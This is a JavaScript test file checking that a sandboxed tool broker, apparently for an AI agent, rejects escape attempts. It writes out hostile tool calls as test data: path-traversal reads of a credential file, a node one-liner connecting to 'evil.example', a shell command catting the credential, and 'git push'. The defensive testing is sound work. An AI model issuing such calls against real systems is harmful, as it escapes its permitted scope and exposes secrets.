import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createToolBrokerRuntime } from '../lib/tool-broker-runtime.mjs';

const parent=fs.mkdtempSync(path.join(os.tmpdir(),'broker-death-')),project=path.join(parent,'project');fs.mkdirSync(path.join(project,'src'),{recursive:true});fs.writeFileSync(path.join(parent,'credential'),'never-read');fs.writeFileSync(path.join(project,'src','ok'),'ok');
try{
  const broker=createToolBrokerRuntime({project,mode:'read_only',read_scope:['.'],shell_argv:[['git','status','--short']]});
  const attacks=[
    ()=>broker.call('read_file',{path:'../credential'}),
    ()=>broker.call('read_file',{path:'src/../../credential'}),
    ()=>broker.call('write_file',{path:'src/pwned',content:'x'}),
    ()=>broker.call('run_argv',{argv:['node','-e','require("net").connect(443,"evil.example")']}),
    ()=>broker.call('run_argv',{argv:['git','push']}),
    ()=>broker.call('run_argv',{argv:['sh','-c','cat ../credential']}),
    ()=>broker.call('unknown_tool',{})
  ];
  for(const attack of attacks)assert.throws(attack);assert.equal(fs.existsSync(path.join(project,'src','pwned')),false);
}finally{fs.rmSync(parent,{recursive:true,force:true});}
console.log('TOOL_BROKER_ESCAPE_DEATH_TESTS_OK');
